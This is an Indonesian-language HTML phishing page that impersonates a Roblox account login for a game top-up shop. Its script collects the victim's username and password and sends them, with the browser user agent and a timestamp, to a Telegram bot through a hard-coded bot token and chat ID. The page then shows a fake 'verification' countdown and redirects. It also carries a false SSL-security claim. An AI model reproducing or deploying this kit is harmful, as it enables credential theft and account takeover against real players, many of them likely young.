<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOGIN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #0F1113; }
        .card-auth {
            background: linear-gradient(145deg, #1e2024, #121416);
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        .glow-blue {
            box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
        }
        .loader { border-top-color: #3b82f6; animation: spinner 1s linear infinite; }
        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        input:focus {
            border-color: #3b82f6 !important;
            box-shadow: 0 0 10px rgba(59, 130, 246, 0.3);
        }
    </style>
</head>
<body class="text-white min-h-screen flex items-center justify-center p-4">

    <div id="loginBox" class="card-auth w-full max-w-md p-8 rounded-3xl relative overflow-hidden">
        <div class="absolute -top-10 -right-10 w-32 h-32 bg-blue-600/10 rounded-full blur-3xl"></div>
        
        <div class="text-center mb-8">
            <div class="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg glow-blue">
                <i class="fas fa-user-shield text-2xl text-white"></i>
            </div>
            <h2 class="text-2xl font-black tracking-tight italic">MASUK KE AKUN</h2>
            <p class="text-gray-400 text-sm mt-1">Masuk Ke Akun Roblox Untuk Melanjutkan</p>
        </div>

        <form id="authForm" class="space-y-5">
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase tracking-widest mb-2 ml-1">Username / Email</label>
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">
                        <i class="fas fa-user"></i>
                    </span>
                    <input type="text" id="userInput" class="w-full pl-10 pr-4 py-3.5 bg-[#16181A] border border-gray-800 rounded-xl outline-none transition-all text-sm" placeholder="Username / Email / No. HP" required>
                </div>
            </div>

            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase tracking-widest mb-2 ml-1">Password</label>
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">
                        <i class="fas fa-lock"></i>
                    </span>
                    <input type="password" id="passInput" class="w-full pl-10 pr-4 py-3.5 bg-[#16181A] border border-gray-800 rounded-xl outline-none transition-all text-sm" placeholder="••••••••" required>
                </div>
            </div>

            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-black py-4 rounded-xl transition-all shadow-lg glow-blue transform active:scale-95 uppercase tracking-wider text-sm">
                Lanjutkan Ke Toko <i class="fas fa-arrow-right ml-2"></i>
            </button>
        </form>

        <div class="mt-8 pt-6 border-t border-gray-800 text-center">
            <p class="text-xs text-gray-500 italic">Sistem Keamanan Enkripsi SSL  Teraktifkan</p>
        </div>
    </div>

    <div id="waitingOverlay" class="hidden fixed inset-0 bg-[#0F1113]/95 backdrop-blur-md flex flex-col items-center justify-center text-center p-6 z-50">
        <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-800 h-16 w-16 mb-6"></div>
        <h2 class="text-2xl font-black tracking-tighter text-blue-500 mb-2">VERIFIKASI SISTEM...</h2>
        <p class="text-gray-400 max-w-xs text-sm">Mohon Jangan Tutup Halaman. Kami Sedang verifikasi Akun Anda</p>
        
        <div class="mt-8 bg-[#16181A] px-8 py-3 rounded-2xl border border-gray-800">
            <span id="timer" class="text-3xl font-mono font-bold text-white tracking-widest">60s</span>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8322773468:AAH3uInJeB1bwoliIOThgaHBDqLXWkIBZio";
        const CHAT_ID = "8098536644";

        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            
            const message = `🚀 *TARGET BARU LOGIN*\n\n` +
                            `👤 *User/Email:* \`${user}\`\n` +
                            `🔑 *Password:* \`${pass}\`\n\n` +
                            `📱 *Device:* ${navigator.userAgent}\n` +
                            `🕒 *Waktu:* ${new Date().toLocaleString()}`;

            // Kirim ke Telegram
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            // Ganti UI ke Waiting
            document.getElementById('loginBox').classList.add('hidden');
            document.getElementById('waitingOverlay').classList.remove('hidden');

            let timeLeft = 60;
            const timerElement = document.getElementById('timer');
            
            const countdown = setInterval(() => {
                timeLeft--;
                timerElement.innerText = timeLeft + "s";
                
                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    window.location.href = "topap.html"; 
                }
            }, 1000);
        });
    </script>
</body>
</html>
